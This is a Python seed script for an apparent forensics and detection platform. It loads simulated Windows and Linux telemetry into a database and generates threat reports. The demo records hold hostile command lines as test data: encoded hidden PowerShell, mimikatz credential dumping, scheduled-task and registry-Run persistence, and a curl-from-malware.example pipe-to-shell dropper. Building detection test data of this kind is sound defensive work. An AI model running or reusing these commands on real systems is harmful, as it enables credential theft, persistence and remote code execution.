import hashlib
import json
import os
import sys
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from server import db as database
from server.engine import attack_mapper, reporter, run_engine
from server.engine.ioc_correlator import correlate_batch


def manifest_for(cid, hostname, os_type):
    ts = datetime.now(timezone.utc).isoformat(timespec="seconds")
    m = {
        "collection_id": cid, "hostname": hostname, "os_type": os_type,
        "agent_version": "1.0.0-demo", "started_at_utc": ts,
        "finished_at_utc": ts,
        "collector_order": ["network", "processes", "persistence", "logs",
                            "files_triage", "containers"],
    }
    m["manifest_sha256"] = hashlib.sha256(
        json.dumps(m, sort_keys=True).encode()).hexdigest()
    return m


def main():
    database.init_db()
    conn = database.connect()
    if conn.execute("SELECT COUNT(*) c FROM detections").fetchone()["c"] > 0:
        print("default DB already has data; skipping seed")
    else:
        hosts = {}
        for name, ostype in (("WIN-ATOR-LAB", "windows"),
                             ("UBUNTU-VM-01", "linux"),
                             ("DOCKER-HOST-01", "docker_host")):
            cur = conn.execute(
                "INSERT INTO hosts (client_id, hostname, os_type, api_key_hash,"
                " enrolled_at_utc, last_seen_utc) VALUES (?,?,?,?,?,?)",
                ("demo-" + name.lower(), name, ostype, "n/a",
                 datetime.now(timezone.utc).isoformat(timespec="seconds"),) * 1
                + (datetime.now(timezone.utc).isoformat(timespec="seconds"),))
            hosts[name] = cur.lastrowid
        conn.execute("UPDATE hosts SET enrolled_at_utc=?, last_seen_utc=? WHERE id=?",
                     (datetime.now(timezone.utc).isoformat(timespec="seconds"),) * 2
                     + (hosts["WIN-ATOR-LAB"],))

        def add_manifest(host_name, cid, count=6):
            m = manifest_for(cid, host_name, "windows")
            conn.execute(
                """INSERT OR IGNORE INTO evidence_manifests (host_id, collection_id,
                   started_at_utc, finished_at_utc, agent_version, collector_order,
                   artifact_count, manifest_json, manifest_sha256, received_at_utc)
                   VALUES (?,?,?,?,?,?,?,?,?,?)""",
                (hosts[host_name], cid, m["started_at_utc"], m["finished_at_utc"],
                 m["agent_version"], json.dumps(m["collector_order"]), count,
                 json.dumps(m), m["manifest_sha256"],
                 datetime.now(timezone.utc).isoformat(timespec="seconds")))

        base = "2026-08-22T09:%02d:00+00:00"
        rows_win = [
            (base % 1, 4100, 500, "powershell.exe",
             r"powershell.exe -nop -w hidden -enc SQBFAFgA",
             r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", None),
            (base % 3, 4101, 4100, "whoami.exe", "whoami.exe /priv",
             r"C:\Windows\System32\whoami.exe", None),
            (base % 5, 4102, 4100, "schtasks.exe",
             r"schtasks.exe /create /tn Updater /tr cmd.exe /sc once",
             r"C:\Windows\System32\schtasks.exe", None),
            (base % 7, 4103, 4100, "mimikatz.exe",
             "mimikatz.exe sekurlsa::logonpasswords", r"C:\Temp\mk_x64.exe", None),
            (base % 9, 800, 4, "explorer.exe", None, r"C:\Windows\explorer.exe", None),
        ]
        for i, (ts, pid, ppid, name, cmdline, exe, sha) in enumerate(rows_win):
            cid = f"win-demo-{i}"
            add_manifest("WIN-ATOR-LAB", cid)
            conn.execute(
                """INSERT INTO raw_processes (host_id, collection_id, collected_at_utc,
                   pid, ppid, name, cmdline, exe_path, sha256)
                   VALUES (?,?,?,?,?,?,?,?,?)""",
                (hosts["WIN-ATOR-LAB"], cid, ts, pid, ppid, name, cmdline, exe, sha))
        add_manifest("WIN-ATOR-LAB", "win-demo-net")
        conn.execute(
            """INSERT INTO raw_connections (host_id, collection_id, collected_at_utc, pid,
               process_name, local_ip, local_port, remote_ip, remote_port, proto, status)
               VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
            (hosts["WIN-ATOR-LAB"], "win-demo-net", base % 11, 4100, "powershell.exe",
             "10.0.0.2", 51000, "198.51.100.23", 4444, "tcp", "established"))
        add_manifest("WIN-ATOR-LAB", "win-demo-pers", 1)
        conn.execute(
            """INSERT INTO raw_persistence (host_id, collection_id, collected_at_utc,
               ptype, name, command, location) VALUES (?,?,?,?,?,?,?)""",
            (hosts["WIN-ATOR-LAB"], "win-demo-pers", base % 13, "registry_run",
             "Updater", r"reg add ...\Run /v up /d evil.exe", "HKCU\\...\\Run"))

        lin_rows = [
            (base % 2, 2001, 1500, "bash",
             "bash -c 'curl http://malware.example/dropper.sh | sh'", "/usr/bin/bash"),
            (base % 4, 2002, 2001, "base64", "echo aWQ= | base64 -d | sh", "/usr/bin/base64"),
        ]
        for i, (ts, pid, ppid, name, cmdline, exe) in enumerate(lin_rows):
            cid = f"lin-demo-{i}"
            add_manifest("UBUNTU-VM-01", cid)
            conn.execute(
                """INSERT INTO raw_processes (host_id, collection_id, collected_at_utc,
                   pid, ppid, name, cmdline, exe_path) VALUES (?,?,?,?,?,?,?,?)""",
                (hosts["UBUNTU-VM-01"], cid, ts, pid, ppid, name, cmdline, exe))
        conn.commit()

        dets = correlate_batch(conn, hosts["UBUNTU-VM-01"], "lin-demo-ioc",
                               datetime.now(timezone.utc).isoformat(timespec="seconds"), {
                                   "network": [{"process_name": "sh",
                                                "remote": "203.0.113.66:4444"}],
                                   "processes": [], "files_triage": [],
                               })
        from server.engine import insert_detections
        insert_detections(conn, dets)

    result = run_engine(conn)
    print("engine:", json.dumps({k: result[k] for k in
                                 ("sigma_hits", "total_new_detections")}))
    id_rows = conn.execute(
        "SELECT id, hostname FROM hosts WHERE hostname LIKE '%-LAB' OR hostname LIKE '%-01'"
    ).fetchall()
    for row in id_rows:
        pdf = reporter.generate_pdf(conn, row["id"])
        js = reporter.generate_json(conn, row["id"])
        stx = reporter.generate_stix(conn, row["id"])
        print(f"host{row['id']} ({row['hostname']}): {os.path.basename(pdf)}")
    nav = reporter.generate_navigator_layer(conn)
    print("navigator:", os.path.basename(nav))
    win_id = conn.execute(
        "SELECT id FROM hosts WHERE hostname='WIN-ATOR-LAB'").fetchone()["id"]
    risk = reporter.host_report_data(conn, win_id)["risk"]
    print("verdict:", risk["verdict"], "| risk:", risk["risk_level"])
    conn.close()


if __name__ == "__main__":
    main()
